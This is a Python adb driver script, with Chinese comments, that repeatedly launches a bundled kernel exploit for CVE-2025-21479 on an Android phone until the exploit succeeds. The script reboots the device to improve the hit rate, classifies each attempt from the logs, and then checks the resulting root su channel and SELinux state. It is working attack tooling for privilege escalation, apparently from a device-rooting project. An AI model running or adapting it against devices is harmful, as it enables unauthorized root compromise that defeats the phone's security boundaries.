#!/usr/bin/env python3
# run_su_until_root.py - 反复执行内置 su 版 exploit 直到命中, 并验证 su 通道
#
# 背景: CVE-2025-21479 的 GPU spray 是概率性的, 一次进程内跑完 44 个候选仍可能全灭。
#       三种结局必须分开处理, 否则会把"没命中"误判成"已 root":
#         ① 命中           -> 日志出现 "[su] 内置 su 服务已就绪"; 立刻验证 su
#         ② 未命中不重启   -> 日志出现 "All attempts failed" / "phyray sweep exhausted"
#         ③ 未命中且重启   -> adb 掉线后回来 + boot_id 变化 (真机实测常见)
#       ②③ 都需要重来, 且 ② 之后同一 boot 的内存布局已经脏了 -> 默认直接重启再试。
#
# 冷窗口: 项目实测命中率在重启后几分钟内最高 (见 docs/DEBUG_RECORD.md), 故默认先重启。
#
# 用法:
#   python3 run_su_until_root.py                      # 默认: 先重启, 最多 5 次
#   python3 run_su_until_root.py --attempts 3 --no-reboot-first
#   python3 run_su_until_root.py --dry-run            # 只做环境自检 + 推送, 不跑 exploit
#   python3 run_su_until_root.py --adb /path/to/adb --serial XXXX
#
# 不做的事 (红线): 不 insmod 任何内核模块, 不改分区, 只跑 exploit + 验证 su。
import argparse
import hashlib
import os
import re
import shutil
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
DEFAULT_BIN = os.path.join(ROOT, 'exploit', 'exploit_vivo_neo9_stable_su_ndk13')
REMOTE_DIR = '/data/local/tmp'

HIT_MARKERS = [
    '[su] 内置 su 服务已就绪',
    'root ready (caps mode',
]
MISS_MARKERS = [
    'All attempts failed',
    'phyaddr sweep exhausted',
]
PROGRESS_MARKERS = [
    'GPU R/W ready',
    '读路径探针',
    'cap_bprm_creds_from_file patched',
    '[stab] GPU 资源已释放',
]


class Adb:
    def __init__(self, path, serial, verbose=True):
        self.path = path
        self.serial = serial
        self.verbose = verbose

    def run(self, args, timeout=30, check=False):
        cmd = [self.path] + (['-s', self.serial] if self.serial else []) + args
        try:
            # errors='replace': 设备端日志里混有二进制/被 tail -c 截断的多字节序列,
            # 严格 utf-8 解码会直接抛 UnicodeDecodeError 把整个驱动打崩 (曾实际发生)。
            p = subprocess.run(cmd, capture_output=True, text=True,
                               encoding='utf-8', errors='replace', timeout=timeout)
            out = (p.stdout or '') + (p.stderr or '')
        except subprocess.TimeoutExpired:
            return 124, ''
        except OSError as e:
            return 125, 'adb 调用失败: %s' % e
        if check and p.returncode != 0:
            raise RuntimeError('adb %s 失败: %s' % (' '.join(args[:2]), out.strip()[:200]))
        return p.returncode, out

    def shell(self, script, timeout=30):
        return self.run(['shell', script], timeout=timeout)

    def out(self, script, timeout=30):
        rc, o = self.shell(script, timeout=timeout)
        return o.strip()

    def state(self):
        rc, o = self.run(['get-state'], timeout=15)
        return o.strip() if rc == 0 else 'unknown'

    def devices(self):
        rc, o = self.run(['devices'], timeout=15)
        return o


def log(msg):
    print('[%s] %s' % (time.strftime('%H:%M:%S'), msg), flush=True)


def sha256_local(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(1 << 20), b''):
            h.update(chunk)
    return h.hexdigest()


def wait_device(adb, timeout=180):
    """等设备回到 device 状态且 boot_completed=1"""
    t0 = time.time()
    while time.time() - t0 < timeout:
        if adb.state() == 'device':
            if adb.out('getprop sys.boot_completed') == '1':
                return True
        time.sleep(2)
    return False


def device_env(adb):
    """采集本次 boot 的标识与关键状态"""
    e = {}
    e['boot_id'] = adb.out('cat /proc/sys/kernel/random/boot_id')
    e['uptime'] = adb.out("cut -d. -f1 /proc/uptime")
    e['selinux'] = adb.out('getenforce')
    e['mem_avail'] = adb.out("grep MemAvailable /proc/meminfo")
    return e


def push_binary(adb, local, remote):
    want = sha256_local(local)
    have = adb.out('sha256sum %s 2>/dev/null' % remote)
    if want[:16] in have:
        log('二进制已在设备上且哈希一致 (sha256 %s…)' % want[:16])
        return want
    log('推送 %s -> %s (本地 sha256 %s…)' % (os.path.basename(local), remote, want[:16]))
    rc, o = adb.run(['push', local, remote], timeout=180)
    if rc != 0:
        raise RuntimeError('push 失败: %s' % o.strip()[:300])
    adb.shell('chmod 755 %s' % remote)
    got = adb.out('sha256sum %s 2>/dev/null' % remote)
    if want[:16] not in got:
        raise RuntimeError('推送后哈希不一致: %s' % got)
    log('推送完成并校验哈希一致')
    return want


def launch(adb, remote, remote_dir, logname, env):
    envs = ' '.join('%s=%s' % kv for kv in env.items())
    script = 'cd %s && %s nohup %s > %s 2>&1 &' % (remote_dir, envs, remote, logname)
    adb.shell(script, timeout=30)
    time.sleep(2)


def read_log(adb, remote_dir, logname, nbytes=4000):
    p = '%s/%s' % (remote_dir, logname)
    rc, o = adb.shell('tail -c %d %s 2>/dev/null' % (nbytes, p), timeout=30)
    if rc == 0 and o.strip():
        return o
    rc, o = adb.shell('cat %s 2>/dev/null' % p, timeout=30)
    return o


def classify(adb, text, boot_id):
    for m in HIT_MARKERS:
        if m in text:
            return 'HIT', m
    for m in MISS_MARKERS:
        if m in text:
            return 'MISS_NO_REBOOT', m
    cur = adb.out('cat /proc/sys/kernel/random/boot_id')
    if cur and boot_id and cur != boot_id:
        return 'MISS_REBOOT', 'boot_id 变化'
    if adb.state() != 'device':
        return 'OFFLINE', adb.state()
    return None, None


def pull_log(adb, remote_dir, logname, dest_dir):
    """把设备端的尝试日志拉回本地留证"""
    try:
        os.makedirs(dest_dir, exist_ok=True)
    except Exception:
        return None
    src = '%s/%s' % (remote_dir, logname)
    dst = os.path.join(dest_dir, logname)
    rc, o = adb.run(['pull', src, dst], timeout=60)
    if rc == 0 and os.path.exists(dst):
        log('已拉取设备日志 -> %s (%d 字节)' % (dst, os.path.getsize(dst)))
        return dst
    return None


def verify_su(adb, remote, remote_dir):
    """命中后验证 su 通道 (不执行任何特权写操作)"""
    ok = True
    log('--- 验证内置 su 通道 ---')
    rc, o = adb.shell('%s --su --ping' % remote, timeout=30)
    log('--ping  -> %s' % ' | '.join(x for x in o.splitlines() if x.strip())[:200])
    ok &= ('PONG' in o)

    rc, o = adb.shell('%s --su --id' % remote, timeout=30)
    for line in o.splitlines():
        if line.strip():
            log('--id    %s' % line.strip())
    ok &= ('CapEff' in o)
    fsuid0 = re.search(r'fsuid=(\d+)', o)
    if fsuid0:
        log('fsuid=%s (期望 0)' % fsuid0.group(1))

    rc, o = adb.shell("%s --su -c 'id; getenforce; echo rc=$?'" % remote, timeout=60)
    log('-c id   -> %s' % ' | '.join(x for x in o.splitlines() if x.strip())[:300])
    # 硬门槛: 命令真的被执行了。SELinux 状态只作提示 —— 它没被翻成 permissive
    # 不代表通道不可用 (exploit 对 selinux_state 的写是容错的)。
    ok &= ('uid=' in o or 'rc=0' in o)
    if 'Permissive' not in o:
        log('注意: getenforce 未显示 Permissive —— SELinux 未翻转, '
            'KSU/模块加载相关的操作可能被拦 (不影响 su 命令执行)')

    rc, o = adb.shell('ls -l %s/su_ready.txt %s/su.sock 2>&1' % (remote_dir, remote_dir), timeout=30)
    log('socket  -> %s' % ' | '.join(x for x in o.splitlines() if x.strip())[:200])
    return ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--adb', default=os.environ.get('ADB', 'adb'))
    ap.add_argument('--serial', default=os.environ.get('ANDROID_SERIAL', ''))
    ap.add_argument('--binary', default=DEFAULT_BIN)
    ap.add_argument('--attempts', type=int, default=5)
    ap.add_argument('--timeout', type=int, default=420, help='单次 exploit 超时(秒)')
    ap.add_argument('--stext-pa', default='0xa8010000')
    ap.add_argument('--patch-cap', default='1')
    ap.add_argument('--settle-ms', default='', help='传给 exploit 的 CHEESE_SETTLE_MS')
    ap.add_argument('--stab-verbose', default='1')
    ap.add_argument('--reboot-first', dest='reboot_first', action='store_true', default=True)
    ap.add_argument('--no-reboot-first', dest='reboot_first', action='store_false')
    ap.add_argument('--reboot-on-miss', dest='reboot_on_miss', action='store_true', default=True)
    ap.add_argument('--no-reboot-on-miss', dest='reboot_on_miss', action='store_false')
    ap.add_argument('--boot-wait', type=int, default=180)
    ap.add_argument('--pull-dir', default=os.path.join(HERE, 'logs'),
                    help='设备端尝试日志拉回目录')
    ap.add_argument('--dry-run', action='store_true')
    a = ap.parse_args()

    if not os.path.exists(a.binary):
        log('找不到二进制: %s' % a.binary)
        return 2
    adb = Adb(a.adb, a.serial)

    log('=== 环境自检 ===')
    adb_bin = shutil.which(a.adb) or (a.adb if os.path.exists(a.adb) else None)
    log('adb: %s' % (adb_bin or a.adb))
    devs = adb.devices()
    log('devices 输出: %s' % ' / '.join(x for x in devs.splitlines() if x.strip())[:200])
    if adb.state() != 'device':
        log('设备不可用 (state=%s)。若在容器/沙箱里跑, 不要 kill-server, '
            '直接复用宿主机已在运行的 adb server。' % adb.state())
        return 3

    env0 = device_env(adb)
    log('boot_id=%s uptime=%ss selinux=%s %s'
        % (env0['boot_id'][:8], env0['uptime'], env0['selinux'], env0['mem_avail']))
    remote = '%s/%s' % (REMOTE_DIR, os.path.basename(a.binary))
    push_binary(adb, a.binary, remote)

    if a.dry_run:
        log('--dry-run: 跳过 reboot 与 exploit 执行')
        return 0

    if a.reboot_first or int(env0['uptime'] or 0) > 300:
        if a.reboot_first:
            log('=== 冷窗口: 重启设备 (uptime %ss) ===' % env0['uptime'])
        else:
            log('=== uptime %ss 已超出冷窗口, 重启一次以最大化命中率 ===' % env0['uptime'])
        adb.run(['reboot'], timeout=30)
        time.sleep(5)
        if not wait_device(adb, a.boot_wait):
            log('等待重启超时')
            return 4
        log('设备已回 boot_completed=1')

    envs = {
        'CHEESE_STEXT_PA': a.stext_pa,
        'CHEESE_PATCH_CAP': a.patch_cap,
        'CHEESE_STAB_VERBOSE': a.stab_verbose,
    }
    if a.settle_ms:
        envs['CHEESE_SETTLE_MS'] = a.settle_ms

    results = []
    for n in range(1, a.attempts + 1):
        log('')
        log('========== 第 %d/%d 次 ==========' % (n, a.attempts))
        prep = device_env(adb)
        log('uptime=%ss selinux=%s' % (prep['uptime'], prep['selinux']))
        logname = 'su_attempt%d.log' % n
        adb.shell('rm -f %s/%s' % (REMOTE_DIR, logname))
        launch(adb, remote, REMOTE_DIR, logname, envs)
        log('已启动 %s (env: %s)' % (os.path.basename(remote),
                                    ' '.join('%s=%s' % kv for kv in envs.items())))

        t0 = time.time()
        outcome, why = None, ''
        last_len = 0
        while time.time() - t0 < a.timeout:
            time.sleep(3)
            text = read_log(adb, REMOTE_DIR, logname)
            if len(text) > last_len:
                for line in text[last_len:].splitlines():
                    if any(m in line for m in PROGRESS_MARKERS):
                        log('  · %s' % line.strip()[:140])
                last_len = len(text)
            outcome, why = classify(adb, text, prep['boot_id'])
            if outcome:
                break
        if outcome is None:
            outcome, why = 'TIMEOUT', '%ds 无结论' % a.timeout
            text = read_log(adb, REMOTE_DIR, logname, 8000)

        dur = int(time.time() - t0)
        log('结论: %s (%s, 耗时 %ds)' % (outcome, why, dur))
        results.append((n, outcome, why, dur))
        # 收尾报告纯属取证, 任何异常都不允许影响判定与后续流程
        # (曾经因为日志解码异常在 HIT 之后崩掉, 连 su 通道验证都没跑到)
        try:
            log('--- 设备日志尾部 ---')
            for line in read_log(adb, REMOTE_DIR, logname, 1500).splitlines()[-12:]:
                log('  | %s' % line.strip()[:150])
            pull_log(adb, REMOTE_DIR, logname, a.pull_dir)
        except Exception as e:
            log('(取证步骤异常, 已忽略: %s)' % e)

        if outcome == 'HIT':
            ok = verify_su(adb, remote, REMOTE_DIR)
            log('')
            log('=== 命中并完成验证: %s ===' % ('su 通道可用' if ok else 'su 通道异常, 见上')) 
            log('提示: 之后需要 euid=0 的接口才用 --su --u0 (需先中和 vr.ko); '
                '软重启前先跑 unpatch.ko + vrpatch.ko (由你手动加载)')
            return 0 if ok else 5

        if outcome in ('MISS_REBOOT', 'OFFLINE'):
            log('设备在重启, 等待回状态…')
            if not wait_device(adb, a.boot_wait):
                log('等待设备超时')
                return 4
        elif outcome in ('MISS_NO_REBOOT', 'TIMEOUT'):
            if a.reboot_on_miss:
                log('未命中且设备未重启 -> 主动重启以刷新内存布局')
                adb.run(['reboot'], timeout=30)
                time.sleep(5)
                if not wait_device(adb, a.boot_wait):
                    log('等待重启超时')
                    return 4
            else:
                log('未命中, 不重启直接再试 (命中率更低)')
        time.sleep(3)

    log('')
    log('=== %d 次均未命中 ===' % a.attempts)
    for n, o, w, d in results:
        log('  第 %d 次: %s (%s, %ds)' % (n, o, w, d))
    log('建议: 冷启动后立刻重试; 或先确认设备内存状态 (MemAvailable) 与是否已在冷窗口')
    return 6


if __name__ == '__main__':
    sys.exit(main())
